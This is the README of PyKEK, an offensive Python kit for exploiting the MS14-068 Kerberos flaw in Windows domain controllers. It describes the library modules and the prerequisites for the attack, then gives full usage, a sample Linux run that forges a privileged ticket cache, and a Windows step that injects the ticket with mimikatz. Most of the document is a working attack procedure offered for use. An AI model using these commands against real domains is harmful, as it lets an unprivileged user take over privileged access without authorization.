Python Kerberos Exploitation Kit
===

PyKEK (Python Kerberos Exploitation Kit), a python library to manipulate KRB5-related data. (Still in development)
For now, only a few functionalities have been implemented (in a quite Quick'n'Dirty way) to exploit  MS14-068 (CVE-2014-6324) .
More is coming...

# Library content
* kek.krb5: Kerberos V5 ([RFC 4120](https://tools.ietf.org/html/rfc4120)) ASN.1 structures and basic protocol functions
* kek.ccache: Credential Cache Binary Format ([cchache](http://www.gnu.org/software/shishi/manual/html_node/The-Credential-Cache-Binary-File-Format.html)
* kek.pac: Microsoft Privilege Attribute Certificate Data Structure ([MS-PAC](http://msdn.microsoft.com/en-us/library/cc237917.aspx))
* kek.crypto: Kerberos and MS specific cryptographic functions

# Exploits
## ms14-068.py
To exploit MS14-068, you need :
 - A (one-way) trust relationship between a domain A and a domain B
 - An un-privileged user account on domain A
 - A resource on domain B accessible to privileged user of domain A

## Usage :
USAGE:
ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>

OPTIONS:
    -p <clearPassword>
 --rc4 <ntlmHash>

## Example usage :
# Linux (tested with samba and MIT Kerberos)
root@kali:~/sploit/pykek# python ms14-068.py -u user-a-1@dom-a.loc -s S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc
Password: 
  [+] Building AS-REQ for dc-a-2003.dom-a.loc... Done!
  [+] Sending AS-REQ to dc-a-2003.dom-a.loc... Done!
  [+] Receiving AS-REP from dc-a-2003.dom-a.loc... Done!
  [+] Parsing AS-REP from dc-a-2003.dom-a.loc... Done!
  [+] Building TGS-REQ for dc-a-2003.dom-a.loc... Done!
  [+] Sending TGS-REQ to dc-a-2003.dom-a.loc... Done!
  [+] Receiving TGS-REP from dc-a-2003.dom-a.loc... Done!
  [+] Parsing TGS-REP from dc-a-2003.dom-a.loc... Done!
  [+] Creating ccache file 'TGT_user-a-1@dom-a.loc.ccache'... Done!
root@kali:~/sploit/pykek# mv TGT_user-a-1@dom-a.loc.ccache /tmp/krb5cc_0 

# Windows
On a windows machine (using Python for Windows) :
python.exe ms14-068.py -u user-a-1@dom-a.loc -s S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc
mimikatz.exe "kerberos::ptc TGT_user-a-1@dom-a.loc.ccache" exit
